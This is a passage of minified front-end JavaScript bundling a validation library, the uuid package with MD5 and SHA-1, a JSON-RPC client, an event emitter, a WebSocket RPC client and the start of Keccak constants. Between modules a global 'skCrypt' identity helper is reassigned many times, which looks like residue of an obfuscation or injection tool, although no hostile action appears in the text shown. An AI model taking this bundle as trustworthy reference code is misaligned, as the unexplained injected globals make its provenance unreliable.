        Array.isArray(t) || `Expected an array, but received: ${Fr(t)}`,
      coercer: (t) => (Array.isArray(t) ? t.slice() : t),
    });
  }
  function co(t) {
    const e = Object.keys(t);
    return new Hr({
      type: "type",
      schema: t,
      *entries(n) {
        if (Kr(n)) for (const r of e) yield [r, n[r], t[r]];
      },
      validator: (t) => Wr(t) || `Expected an object, but received: ${Fr(t)}`,
      coercer: (t) => (Wr(t) ? { ...t } : t),
    });
  }
  function lo(t) {
    const e = t.map((t) => t.type).join(" | ");
    return new Hr({
      type: "union",
      schema: null,
      coercer(e, n) {
        for (const r of t) {
          const [t, o] = r.validate(e, { coerce: !0, mask: n.mask });
          if (!t) return o;
        }
        return e;
      },
      validator(n, r) {
        const o = [];
        for (const e of t) {
          const [...t] = Vr(n, e, r),
            [i] = t;
          if (!i[0]) return [];
          for (const [e] of t) e && o.push(e);
        }
        return [
          `Expected the value to satisfy a union of \`${e}\`, but received: ${Fr(
            n
          )}`,
          ...o,
        ];
      },
    });
  }
  function fo() {
    return Qr("unknown", () => !0);
  }
  function ho(t, e, n) {
    return new Hr({
      ...t,
      coercer: (r, o) => (Jr(r, e) ? t.coercer(n(r, o), o) : t.coercer(r, o)),
    });
  }
  var po;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var mo = new Uint8Array(16);
  function go() {
    if (
      !po &&
      !(po =
        ("undefined" != typeof crypto &&
          crypto.getRandomValues &&
          crypto.getRandomValues.bind(crypto)) ||
        ("undefined" != typeof msCrypto &&
          "function" == typeof msCrypto.getRandomValues &&
          msCrypto.getRandomValues.bind(msCrypto)))
    )
      throw new Error(
        "crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported"
      );
    return po(mo);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const yo =
    /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;
  function wo(t) {
    return "string" == typeof t && yo.test(t);
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  for (var bo, vo, Ao = [], ko = 0; ko < 256; ++ko)
    Ao.push((ko + 256).toString(16).substr(1));
  function Io(t) {
    var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
      n = (
        Ao[t[e + 0]] +
        Ao[t[e + 1]] +
        Ao[t[e + 2]] +
        Ao[t[e + 3]] +
        "-" +
        Ao[t[e + 4]] +
        Ao[t[e + 5]] +
        "-" +
        Ao[t[e + 6]] +
        Ao[t[e + 7]] +
        "-" +
        Ao[t[e + 8]] +
        Ao[t[e + 9]] +
        "-" +
        Ao[t[e + 10]] +
        Ao[t[e + 11]] +
        Ao[t[e + 12]] +
        Ao[t[e + 13]] +
        Ao[t[e + 14]] +
        Ao[t[e + 15]]
      ).toLowerCase();
    if (!wo(n)) throw TypeError("Stringified UUID is invalid");
    return n;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var So = 0,
    _o = 0;
  function To(t) {
    if (!wo(t)) throw TypeError("Invalid UUID");
    var e,
      n = new Uint8Array(16);
    return (
      (n[0] = (e = parseInt(t.slice(0, 8), 16)) >>> 24),
      (n[1] = (e >>> 16) & 255),
      (n[2] = (e >>> 8) & 255),
      (n[3] = 255 & e),
      (n[4] = (e = parseInt(t.slice(9, 13), 16)) >>> 8),
      (n[5] = 255 & e),
      (n[6] = (e = parseInt(t.slice(14, 18), 16)) >>> 8),
      (n[7] = 255 & e),
      (n[8] = (e = parseInt(t.slice(19, 23), 16)) >>> 8),
      (n[9] = 255 & e),
      (n[10] = ((e = parseInt(t.slice(24, 36), 16)) / 1099511627776) & 255),
      (n[11] = (e / 4294967296) & 255),
      (n[12] = (e >>> 24) & 255),
      (n[13] = (e >>> 16) & 255),
      (n[14] = (e >>> 8) & 255),
      (n[15] = 255 & e),
      n
    );
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  function Bo(t, e, n) {
    function r(t, r, o, i) {
      if (
        ("string" == typeof t &&
          (t = (function (t) {
            t = unescape(encodeURIComponent(t));
            for (var e = [], n = 0; n < t.length; ++n) e.push(t.charCodeAt(n));
            return e;
          })(t)),
        "string" == typeof r && (r = To(r)),
        16 !== r.length)
      )
        throw TypeError(
          "Namespace must be array-like (16 iterable integer values, 0-255)"
        );
      var s = new Uint8Array(16 + t.length);
      if (
        (s.set(r),
        s.set(t, r.length),
        ((s = n(s))[6] = (15 & s[6]) | e),
        (s[8] = (63 & s[8]) | 128),
        o)
      ) {
        i = i || 0;
        for (var a = 0; a < 16; ++a) o[i + a] = s[a];
        return o;
      }
      return Io(s);
    }
    try {
      r.name = t;
    } catch (o) {}
    return (
      (r.DNS = "6ba7b810-9dad-11d1-80b4-00c04fd430c8"),
      (r.URL = "6ba7b811-9dad-11d1-80b4-00c04fd430c8"),
      r
    );
  }
  function Co(t) {
    return 14 + (((t + 64) >>> 9) << 4) + 1;
  }
  function Eo(t, e) {
    var n = (65535 & t) + (65535 & e);
    return (((t >> 16) + (e >> 16) + (n >> 16)) << 16) | (65535 & n);
  }
  function xo(t, e, n, r, o, i) {
    return Eo(((s = Eo(Eo(e, t), Eo(r, i))) << (a = o)) | (s >>> (32 - a)), n);
    var s, a;
  }
  function Po(t, e, n, r, o, i, s) {
    return xo((e & n) | (~e & r), t, e, o, i, s);
  }
  function Oo(t, e, n, r, o, i, s) {
    return xo((e & r) | (n & ~r), t, e, o, i, s);
  }
  function Ro(t, e, n, r, o, i, s) {
    return xo(e ^ n ^ r, t, e, o, i, s);
  }
  function Mo(t, e, n, r, o, i, s) {
    return xo(n ^ (e | ~r), t, e, o, i, s);
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  var Lo = Bo("v3", 48, function (t) {
    if ("string" == typeof t) {
      var e = unescape(encodeURIComponent(t));
      t = new Uint8Array(e.length);
      for (var n = 0; n < e.length; ++n) t[n] = e.charCodeAt(n);
    }
    return (function (t) {
      for (
        var e = [], n = 32 * t.length, r = "0123456789abcdef", o = 0;
        o < n;
        o += 8
      ) {
        var i = (t[o >> 5] >>> o % 32) & 255,
          s = parseInt(r.charAt((i >>> 4) & 15) + r.charAt(15 & i), 16);
        e.push(s);
      }
      return e;
    })(
      (function (t, e) {
        (t[e >> 5] |= 128 << e % 32), (t[Co(e) - 1] = e);
        for (
          var n = 1732584193,
            r = -271733879,
            o = -1732584194,
            i = 271733878,
            s = 0;
          s < t.length;
          s += 16
        ) {
          var a = n,
            u = r,
            c = o,
            l = i;
          (n = Po(n, r, o, i, t[s], 7, -680876936)),
            (i = Po(i, n, r, o, t[s + 1], 12, -389564586)),
            (o = Po(o, i, n, r, t[s + 2], 17, 606105819)),
            (r = Po(r, o, i, n, t[s + 3], 22, -1044525330)),
            (n = Po(n, r, o, i, t[s + 4], 7, -176418897)),
            (i = Po(i, n, r, o, t[s + 5], 12, 1200080426)),
            (o = Po(o, i, n, r, t[s + 6], 17, -1473231341)),
            (r = Po(r, o, i, n, t[s + 7], 22, -45705983)),
            (n = Po(n, r, o, i, t[s + 8], 7, 1770035416)),
            (i = Po(i, n, r, o, t[s + 9], 12, -1958414417)),
            (o = Po(o, i, n, r, t[s + 10], 17, -42063)),
            (r = Po(r, o, i, n, t[s + 11], 22, -1990404162)),
            (n = Po(n, r, o, i, t[s + 12], 7, 1804603682)),
            (i = Po(i, n, r, o, t[s + 13], 12, -40341101)),
            (o = Po(o, i, n, r, t[s + 14], 17, -1502002290)),
            (n = Oo(
              n,
              (r = Po(r, o, i, n, t[s + 15], 22, 1236535329)),
              o,
              i,
              t[s + 1],
              5,
              -165796510
            )),
            (i = Oo(i, n, r, o, t[s + 6], 9, -1069501632)),
            (o = Oo(o, i, n, r, t[s + 11], 14, 643717713)),
            (r = Oo(r, o, i, n, t[s], 20, -373897302)),
            (n = Oo(n, r, o, i, t[s + 5], 5, -701558691)),
            (i = Oo(i, n, r, o, t[s + 10], 9, 38016083)),
            (o = Oo(o, i, n, r, t[s + 15], 14, -660478335)),
            (r = Oo(r, o, i, n, t[s + 4], 20, -405537848)),
            (n = Oo(n, r, o, i, t[s + 9], 5, 568446438)),
            (i = Oo(i, n, r, o, t[s + 14], 9, -1019803690)),
            (o = Oo(o, i, n, r, t[s + 3], 14, -187363961)),
            (r = Oo(r, o, i, n, t[s + 8], 20, 1163531501)),
            (n = Oo(n, r, o, i, t[s + 13], 5, -1444681467)),
            (i = Oo(i, n, r, o, t[s + 2], 9, -51403784)),
            (o = Oo(o, i, n, r, t[s + 7], 14, 1735328473)),
            (n = Ro(
              n,
              (r = Oo(r, o, i, n, t[s + 12], 20, -1926607734)),
              o,
              i,
              t[s + 5],
              4,
              -378558
            )),
            (i = Ro(i, n, r, o, t[s + 8], 11, -2022574463)),
            (o = Ro(o, i, n, r, t[s + 11], 16, 1839030562)),
            (r = Ro(r, o, i, n, t[s + 14], 23, -35309556)),
            (n = Ro(n, r, o, i, t[s + 1], 4, -1530992060)),
            (i = Ro(i, n, r, o, t[s + 4], 11, 1272893353)),
            (o = Ro(o, i, n, r, t[s + 7], 16, -155497632)),
            (r = Ro(r, o, i, n, t[s + 10], 23, -1094730640)),
            (n = Ro(n, r, o, i, t[s + 13], 4, 681279174)),
            (i = Ro(i, n, r, o, t[s], 11, -358537222)),
            (o = Ro(o, i, n, r, t[s + 3], 16, -722521979)),
            (r = Ro(r, o, i, n, t[s + 6], 23, 76029189)),
            (n = Ro(n, r, o, i, t[s + 9], 4, -640364487)),
            (i = Ro(i, n, r, o, t[s + 12], 11, -421815835)),
            (o = Ro(o, i, n, r, t[s + 15], 16, 530742520)),
            (n = Mo(
              n,
              (r = Ro(r, o, i, n, t[s + 2], 23, -995338651)),
              o,
              i,
              t[s],
              6,
              -198630844
            )),
            (i = Mo(i, n, r, o, t[s + 7], 10, 1126891415)),
            (o = Mo(o, i, n, r, t[s + 14], 15, -1416354905)),
            (r = Mo(r, o, i, n, t[s + 5], 21, -57434055)),
            (n = Mo(n, r, o, i, t[s + 12], 6, 1700485571)),
            (i = Mo(i, n, r, o, t[s + 3], 10, -1894986606)),
            (o = Mo(o, i, n, r, t[s + 10], 15, -1051523)),
            (r = Mo(r, o, i, n, t[s + 1], 21, -2054922799)),
            (n = Mo(n, r, o, i, t[s + 8], 6, 1873313359)),
            (i = Mo(i, n, r, o, t[s + 15], 10, -30611744)),
            (o = Mo(o, i, n, r, t[s + 6], 15, -1560198380)),
            (r = Mo(r, o, i, n, t[s + 13], 21, 1309151649)),
            (n = Mo(n, r, o, i, t[s + 4], 6, -145523070)),
            (i = Mo(i, n, r, o, t[s + 11], 10, -1120210379)),
            (o = Mo(o, i, n, r, t[s + 2], 15, 718787259)),
            (r = Mo(r, o, i, n, t[s + 9], 21, -343485551)),
            (n = Eo(n, a)),
            (r = Eo(r, u)),
            (o = Eo(o, c)),
            (i = Eo(i, l));
        }
        return [n, r, o, i];
      })(
        (function (t) {
          if (0 === t.length) return [];
          for (
            var e = 8 * t.length, n = new Uint32Array(Co(e)), r = 0;
            r < e;
            r += 8
          )
            n[r >> 5] |= (255 & t[r / 8]) << r % 32;
          return n;
        })(t),
        8 * t.length
      )
    );
  });
  function No(t, e, n, r) {
    switch (t) {
      case 0:
        return (e & n) ^ (~e & r);
      case 1:
      case 3:
        return e ^ n ^ r;
      case 2:
        return (e & n) ^ (e & r) ^ (n & r);
    }
  }
  function Do(t, e) {
    return (t << e) | (t >>> (32 - e));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  var Uo = Bo("v5", 80, function (t) {
    var e = [1518500249, 1859775393, 2400959708, 3395469782],
      n = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
    if ("string" == typeof t) {
      var r = unescape(encodeURIComponent(t));
      t = [];
      for (var o = 0; o < r.length; ++o) t.push(r.charCodeAt(o));
    } else Array.isArray(t) || (t = Array.prototype.slice.call(t));
    t.push(128);
    for (
      var i = t.length / 4 + 2, s = Math.ceil(i / 16), a = new Array(s), u = 0;
      u < s;
      ++u
    ) {
      for (var c = new Uint32Array(16), l = 0; l < 16; ++l)
        c[l] =
          (t[64 * u + 4 * l] << 24) |
          (t[64 * u + 4 * l + 1] << 16) |
          (t[64 * u + 4 * l + 2] << 8) |
          t[64 * u + 4 * l + 3];
      a[u] = c;
    }
    (a[s - 1][14] = (8 * (t.length - 1)) / Math.pow(2, 32)),
      (a[s - 1][14] = Math.floor(a[s - 1][14])),
      (a[s - 1][15] = (8 * (t.length - 1)) & 4294967295);
    for (var d = 0; d < s; ++d) {
      for (var f = new Uint32Array(80), h = 0; h < 16; ++h) f[h] = a[d][h];
      for (var p = 16; p < 80; ++p)
        f[p] = Do(f[p - 3] ^ f[p - 8] ^ f[p - 14] ^ f[p - 16], 1);
      for (
        var m = n[0], g = n[1], y = n[2], w = n[3], b = n[4], v = 0;
        v < 80;
        ++v
      ) {
        var A = Math.floor(v / 20),
          k = (Do(m, 5) + No(A, g, y, w) + b + e[A] + f[v]) >>> 0;
        (b = w), (w = y), (y = Do(g, 30) >>> 0), (g = m), (m = k);
      }
      (n[0] = (n[0] + m) >>> 0),
        (n[1] = (n[1] + g) >>> 0),
        (n[2] = (n[2] + y) >>> 0),
        (n[3] = (n[3] + w) >>> 0),
        (n[4] = (n[4] + b) >>> 0);
    }
    return [
      (n[0] >> 24) & 255,
      (n[0] >> 16) & 255,
      (n[0] >> 8) & 255,
      255 & n[0],
      (n[1] >> 24) & 255,
      (n[1] >> 16) & 255,
      (n[1] >> 8) & 255,
      255 & n[1],
      (n[2] >> 24) & 255,
      (n[2] >> 16) & 255,
      (n[2] >> 8) & 255,
      255 & n[2],
      (n[3] >> 24) & 255,
      (n[3] >> 16) & 255,
      (n[3] >> 8) & 255,
      255 & n[3],
      (n[4] >> 24) & 255,
      (n[4] >> 16) & 255,
      (n[4] >> 8) & 255,
      255 & n[4],
    ];
  });
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const qo = Object.freeze(
      Object.defineProperty(
        {
          __proto__: null,
          NIL: "00000000-0000-0000-0000-000000000000",
          parse: To,
          stringify: Io,
          v1: function (t, e, n) {
            var r = (e && n) || 0,
              o = e || new Array(16),
              i = (t = t || {}).node || bo,
              s = void 0 !== t.clockseq ? t.clockseq : vo;
            if (null == i || null == s) {
              var a = t.random || (t.rng || go)();
              null == i && (i = bo = [1 | a[0], a[1], a[2], a[3], a[4], a[5]]),
                null == s && (s = vo = 16383 & ((a[6] << 8) | a[7]));
            }
            var u = void 0 !== t.msecs ? t.msecs : Date.now(),
              c = void 0 !== t.nsecs ? t.nsecs : _o + 1,
              l = u - So + (c - _o) / 1e4;
            if (
              (l < 0 && void 0 === t.clockseq && (s = (s + 1) & 16383),
              (l < 0 || u > So) && void 0 === t.nsecs && (c = 0),
              c >= 1e4)
            )
              throw new Error(
                "uuid.v1(): Can't create more than 10M uuids/sec"
              );
            (So = u), (_o = c), (vo = s);
            var d = (1e4 * (268435455 & (u += 122192928e5)) + c) % 4294967296;
            (o[r++] = (d >>> 24) & 255),
              (o[r++] = (d >>> 16) & 255),
              (o[r++] = (d >>> 8) & 255),
              (o[r++] = 255 & d);
            var f = ((u / 4294967296) * 1e4) & 268435455;
            (o[r++] = (f >>> 8) & 255),
              (o[r++] = 255 & f),
              (o[r++] = ((f >>> 24) & 15) | 16),
              (o[r++] = (f >>> 16) & 255),
              (o[r++] = (s >>> 8) | 128),
              (o[r++] = 255 & s);
            for (var h = 0; h < 6; ++h) o[r + h] = i[h];
            return e || Io(o);
          },
          v3: Lo,
          v4: function (t, e, n) {
            var r = (t = t || {}).random || (t.rng || go)();
            if (((r[6] = (15 & r[6]) | 64), (r[8] = (63 & r[8]) | 128), e)) {
              n = n || 0;
              for (var o = 0; o < 16; ++o) e[n + o] = r[o];
              return e;
            }
            return Io(r);
          },
          v5: Uo,
          validate: wo,
          version: function (t) {
            if (!wo(t)) throw TypeError("Invalid UUID");
            return parseInt(t.substr(14, 1), 16);
          },
        },
        Symbol.toStringTag,
        { value: "Module" }
      )
    ),
    zo = Wn(qo);
  var Ko, Wo, Fo, jo;
  var Go = (function () {
    if (jo) return Fo;
    (jo = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    const t = zo.v4,
      e = (function () {
        if (Wo) return Ko;
        (Wo = 1),
          (window.skCrypt = function (t) {
            return function () {
              return t;
            };
          });
        const t = zo.v4;
        return (Ko = function (e, n, r, o) {
          if ("string" != typeof e)
            throw new TypeError(e + " must be a string");
          const i = "number" == typeof (o = o || {}).version ? o.version : 2;
          if (1 !== i && 2 !== i) throw new TypeError(i + " must be 1 or 2");
          const s = { method: e };
          if ((2 === i && (s.jsonrpc = "2.0"), n)) {
            if ("object" != typeof n && !Array.isArray(n))
              throw new TypeError(n + " must be an object, array or omitted");
            s.params = n;
          }
          if (void 0 === r) {
            const e =
              "function" == typeof o.generator
                ? o.generator
                : function () {
                    return t();
                  };
            s.id = e(s, o);
          } else
            2 === i && null === r
              ? o.notificationIdNull && (s.id = null)
              : (s.id = r);
          return s;
        });
      })(),
      n = function (e, r) {
        if (!(this instanceof n)) return new n(e, r);
        r || (r = {}),
          (this.options = {
            reviver: void 0 !== r.reviver ? r.reviver : null,
            replacer: void 0 !== r.replacer ? r.replacer : null,
            generator:
              void 0 !== r.generator
                ? r.generator
                : function () {
                    return t();
                  },
            version: void 0 !== r.version ? r.version : 2,
            notificationIdNull:
              "boolean" == typeof r.notificationIdNull && r.notificationIdNull,
          }),
          (this.callServer = e);
      };
    return (
      (Fo = n),
      (n.prototype.request = function (t, n, r, o) {
        const i = this;
        let s = null;
        const a = Array.isArray(t) && "function" == typeof n;
        if (1 === this.options.version && a)
          throw new TypeError("JSON-RPC 1.0 does not support batching");
        if (a || (!a && t && "object" == typeof t && "function" == typeof n))
          (o = n), (s = t);
        else {
          "function" == typeof r && ((o = r), (r = void 0));
          const i = "function" == typeof o;
          try {
            s = e(t, n, r, {
              generator: this.options.generator,
              version: this.options.version,
              notificationIdNull: this.options.notificationIdNull,
            });
          } catch (c) {
            if (i) return o(c);
            throw c;
          }
          if (!i) return s;
        }
        let u;
        try {
          u = JSON.stringify(s, this.options.replacer);
        } catch (c) {
          return o(c);
        }
        return (
          this.callServer(u, function (t, e) {
            i._parseResponse(t, e, o);
          }),
          s
        );
      }),
      (n.prototype._parseResponse = function (t, e, n) {
        if (t) return n(t), void 0;
        if (!e) return n();
        let r;
        try {
          r = JSON.parse(e, this.options.reviver);
        } catch (o) {
          return n(o);
        }
        if (3 === n.length) {
          if (Array.isArray(r)) {
            const t = function (t) {
                return void 0 !== t.error;
              },
              e = function (e) {
                return !t(e);
              };
            return n(null, r.filter(t), r.filter(e));
          }
          return n(null, r.error, r.result);
        }
        n(null, r);
      }),
      Fo
    );
  })();
  const Vo = zn(Go);
  var Ho,
    Zo = { exports: {} };
  var Xo =
    (Ho ||
      ((Ho = 1),
      (function (t) {
        window.skCrypt = function (t) {
          return function () {
            return t;
          };
        };
        var e = Object.prototype.hasOwnProperty,
          n = "~";
        function r() {}
        function o(t, e, n) {
          (this.fn = t), (this.context = e), (this.once = n || !1);
        }
        function i(t, e, r, i, s) {
          if ("function" != typeof r)
            throw new TypeError("The listener must be a function");
          var a = new o(r, i || t, s),
            u = n ? n + e : e;
          return (
            t._events[u]
              ? t._events[u].fn
                ? (t._events[u] = [t._events[u], a])
                : t._events[u].push(a)
              : ((t._events[u] = a), t._eventsCount++),
            t
          );
        }
        function s(t, e) {
          0 === --t._eventsCount ? (t._events = new r()) : delete t._events[e];
        }
        function a() {
          (this._events = new r()), (this._eventsCount = 0);
        }
        Object.create &&
          ((r.prototype = Object.create(null)), new r().__proto__ || (n = !1)),
          (a.prototype.eventNames = function () {
            var t,
              r,
              o = [];
            if (0 === this._eventsCount) return o;
            for (r in (t = this._events))
              e.call(t, r) && o.push(n ? r.slice(1) : r);
            return Object.getOwnPropertySymbols
              ? o.concat(Object.getOwnPropertySymbols(t))
              : o;
          }),
          (a.prototype.listeners = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            if (!r) return [];
            if (r.fn) return [r.fn];
            for (var o = 0, i = r.length, s = new Array(i); o < i; o++)
              s[o] = r[o].fn;
            return s;
          }),
          (a.prototype.listenerCount = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            return r ? (r.fn ? 1 : r.length) : 0;
          }),
          (a.prototype.emit = function (t, e, r, o, i, s) {
            var a = n ? n + t : t;
            if (!this._events[a]) return !1;
            var u,
              c,
              l = this._events[a],
              d = arguments.length;
            if (l.fn) {
              switch ((l.once && this.removeListener(t, l.fn, void 0, !0), d)) {
                case 1:
                  return l.fn.call(l.context), !0;
                case 2:
                  return l.fn.call(l.context, e), !0;
                case 3:
                  return l.fn.call(l.context, e, r), !0;
                case 4:
                  return l.fn.call(l.context, e, r, o), !0;
                case 5:
                  return l.fn.call(l.context, e, r, o, i), !0;
                case 6:
                  return l.fn.call(l.context, e, r, o, i, s), !0;
              }
              for (c = 1, u = new Array(d - 1); c < d; c++)
                u[c - 1] = arguments[c];
              l.fn.apply(l.context, u);
            } else {
              var f,
                h = l.length;
              for (c = 0; c < h; c++)
                switch (
                  (l[c].once && this.removeListener(t, l[c].fn, void 0, !0), d)
                ) {
                  case 1:
                    l[c].fn.call(l[c].context);
                    break;
                  case 2:
                    l[c].fn.call(l[c].context, e);
                    break;
                  case 3:
                    l[c].fn.call(l[c].context, e, r);
                    break;
                  case 4:
                    l[c].fn.call(l[c].context, e, r, o);
                    break;
                  default:
                    if (!u)
                      for (f = 1, u = new Array(d - 1); f < d; f++)
                        u[f - 1] = arguments[f];
                    l[c].fn.apply(l[c].context, u);
                }
            }
            return !0;
          }),
          (a.prototype.on = function (t, e, n) {
            return i(this, t, e, n, !1);
          }),
          (a.prototype.once = function (t, e, n) {
            return i(this, t, e, n, !0);
          }),
          (a.prototype.removeListener = function (t, e, r, o) {
            var i = n ? n + t : t;
            if (!this._events[i]) return this;
            if (!e) return s(this, i), this;
            var a = this._events[i];
            if (a.fn)
              a.fn !== e ||
                (o && !a.once) ||
                (r && a.context !== r) ||
                s(this, i);
            else {
              for (var u = 0, c = [], l = a.length; u < l; u++)
                (a[u].fn !== e ||
                  (o && !a[u].once) ||
                  (r && a[u].context !== r)) &&
                  c.push(a[u]);
              c.length
                ? (this._events[i] = 1 === c.length ? c[0] : c)
                : s(this, i);
            }
            return this;
          }),
          (a.prototype.removeAllListeners = function (t) {
            var e;
            return (
              t
                ? ((e = n ? n + t : t), this._events[e] && s(this, e))
                : ((this._events = new r()), (this._eventsCount = 0)),
              this
            );
          }),
          (a.prototype.off = a.prototype.removeListener),
          (a.prototype.addListener = a.prototype.on),
          (a.prefixed = n),
          (a.EventEmitter = a),
          (t.exports = a);
      })(Zo)),
    Zo.exports);
  const Jo = zn(Xo);
  var Yo = class extends Jo {
    constructor(t, n, r) {
      super(),
        e(this, "socket"),
        (this.socket = new window.WebSocket(t, r)),
        (this.socket.onopen = () => this.emit("open")),
        (this.socket.onmessage = (t) => this.emit("message", t.data)),
        (this.socket.onerror = (t) => this.emit("error", t)),
        (this.socket.onclose = (t) => {
          this.emit("close", t.code, t.reason);
        });
    }
    send(t, e, n) {
      const r = n || e;
      try {
        this.socket.send(t), r();
      } catch (o) {
        r(o);
      }
    }
    close(t, e) {
      this.socket.close(t, e);
    }
    addEventListener(t, e, n) {
      this.socket.addEventListener(t, e, n);
    }
  };
  var Qo = class {
      encode(t) {
        return JSON.stringify(t);
      }
      decode(t) {
        return JSON.parse(t);
      }
    },
    $o = class extends Jo {
      constructor(
        t,
        n = "ws://localhost:8080",
        {
          autoconnect: r = !0,
          reconnect: o = !0,
          reconnect_interval: i = 1e3,
          max_reconnects: s = 5,
          ...a
        } = {},
        u,
        c
      ) {
        super(),
          e(this, "address"),
          e(this, "rpc_id"),
          e(this, "queue"),
          e(this, "options"),
          e(this, "autoconnect"),
          e(this, "ready"),
          e(this, "reconnect"),
          e(this, "reconnect_timer_id"),
          e(this, "reconnect_interval"),
          e(this, "max_reconnects"),
          e(this, "rest_options"),
          e(this, "current_reconnects"),
          e(this, "generate_request_id"),
          e(this, "socket"),
          e(this, "webSocketFactory"),
          e(this, "dataPack"),
          (this.webSocketFactory = t),
          (this.queue = {}),
          (this.rpc_id = 0),
          (this.address = n),
          (this.autoconnect = r),
          (this.ready = !1),
          (this.reconnect = o),
          (this.reconnect_timer_id = void 0),
          (this.reconnect_interval = i),
          (this.max_reconnects = s),
          (this.rest_options = a),
          (this.current_reconnects = 0),
          (this.generate_request_id =
            u ||
            (() =>
              "number" == typeof this.rpc_id
                ? ++this.rpc_id
                : Number(this.rpc_id) + 1)),
          (this.dataPack = c || new Qo()),
          this.autoconnect &&
            this._connect(this.address, {
              autoconnect: this.autoconnect,
              reconnect: this.reconnect,
              reconnect_interval: this.reconnect_interval,
              max_reconnects: this.max_reconnects,
              ...this.rest_options,
            });
      }
      connect() {
        this.socket ||
          this._connect(this.address, {
            autoconnect: this.autoconnect,
            reconnect: this.reconnect,
            reconnect_interval: this.reconnect_interval,
            max_reconnects: this.max_reconnects,
            ...this.rest_options,
          });
      }
      call(t, e, n, r) {
        return (
          r || "object" != typeof n || ((r = n), (n = null)),
          new Promise((o, i) => {
            if (!this.ready) return i(new Error("socket not ready"));
            const s = this.generate_request_id(t, e),
              a = { jsonrpc: "2.0", method: t, params: e || void 0, id: s };
            this.socket.send(this.dataPack.encode(a), r, (t) => {
              if (t) return i(t);
              (this.queue[s] = { promise: [o, i] }),
                n &&
                  (this.queue[s].timeout = setTimeout(() => {
                    delete this.queue[s], i(new Error("reply timeout"));
                  }, n));
            });
          })
        );
      }
      async login(t) {
        const e = await this.call("rpc.login", t);
        if (!e) throw new Error("authentication failed");
        return e;
      }
      async listMethods() {
        return await this.call("__listMethods");
      }
      notify(t, e) {
        return new Promise((n, r) => {
          if (!this.ready) return r(new Error("socket not ready"));
          const o = { jsonrpc: "2.0", method: t, params: e };
          this.socket.send(this.dataPack.encode(o), (t) => {
            if (t) return r(t);
            n();
          });
        });
      }
      async subscribe(t) {
        "string" == typeof t && (t = [t]);
        const e = await this.call("rpc.on", t);
        if ("string" == typeof t && "ok" !== e[t])
          throw new Error(
            "Failed subscribing to an event '" + t + "' with: " + e[t]
          );
        return e;
      }
      async unsubscribe(t) {
        "string" == typeof t && (t = [t]);
        const e = await this.call("rpc.off", t);
        if ("string" == typeof t && "ok" !== e[t])
          throw new Error("Failed unsubscribing from an event with: " + e);
        return e;
      }
      close(t, e) {
        this.socket.close(t || 1e3, e);
      }
      setAutoReconnect(t) {
        this.reconnect = t;
      }
      setReconnectInterval(t) {
        this.reconnect_interval = t;
      }
      setMaxReconnects(t) {
        this.max_reconnects = t;
      }
      _connect(t, e) {
        clearTimeout(this.reconnect_timer_id),
          (this.socket = this.webSocketFactory(t, e)),
          this.socket.addEventListener("open", () => {
            (this.ready = !0), this.emit("open"), (this.current_reconnects = 0);
          }),
          this.socket.addEventListener("message", ({ data: t }) => {
            t instanceof ArrayBuffer && (t = ft.from(t).toString());
            try {
              t = this.dataPack.decode(t);
            } catch (e) {
              return;
            }
            if (t.notification && this.listeners(t.notification).length) {
              if (!Object.keys(t.params).length)
                return this.emit(t.notification);
              const e = [t.notification];
              if (t.params.constructor === Object) e.push(t.params);
              else
                for (let n = 0; n < t.params.length; n++) e.push(t.params[n]);
              return Promise.resolve().then(() => {
                this.emit.apply(this, e);
              });
            }
            if (!this.queue[t.id])
              return t.method
                ? Promise.resolve().then(() => {
                    this.emit(t.method, null == t ? void 0 : t.params);
                  })
                : void 0;
            "error" in t == "result" in t &&
              this.queue[t.id].promise[1](
                new Error(
                  'Server response malformed. Response must include either "result" or "error", but not both.'
                )
              ),
              this.queue[t.id].timeout &&
                clearTimeout(this.queue[t.id].timeout),
              t.error
                ? this.queue[t.id].promise[1](t.error)
                : this.queue[t.id].promise[0](t.result),
              delete this.queue[t.id];
          }),
          this.socket.addEventListener("error", (t) => this.emit("error", t)),
          this.socket.addEventListener("close", ({ code: n, reason: r }) => {
            this.ready && setTimeout(() => this.emit("close", n, r), 0),
              (this.ready = !1),
              (this.socket = void 0),
              1e3 !== n &&
                (this.current_reconnects++,
                this.reconnect &&
                  (this.max_reconnects > this.current_reconnects ||
                    0 === this.max_reconnects) &&
                  (this.reconnect_timer_id = setTimeout(
                    () => this._connect(t, e),
                    this.reconnect_interval
                  )));
          });
      }
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ti = BigInt(0),
    ei = BigInt(1),
    ni = BigInt(2),
    ri = BigInt(7),
    oi = BigInt(256),
    ii = BigInt(113),
    si = [],
    ai = [],
    ui = [];
  for (let FR = 0, jR = ei, GR = 1, VR = 0; FR < 24; FR++) {
    ([GR, VR] = [VR, (2 * GR + 3 * VR) % 5]),
      si.push(2 * (5 * VR + GR)),
      ai.push((((FR + 1) * (FR + 2)) / 2) % 64);
    let t = ti;
    for (let e = 0; e < 7; e++)
      (jR = ((jR << ei) ^ ((jR >> ri) * ii)) % oi),
        jR & ni && (t ^= ei << ((ei << BigInt(e)) - ei));
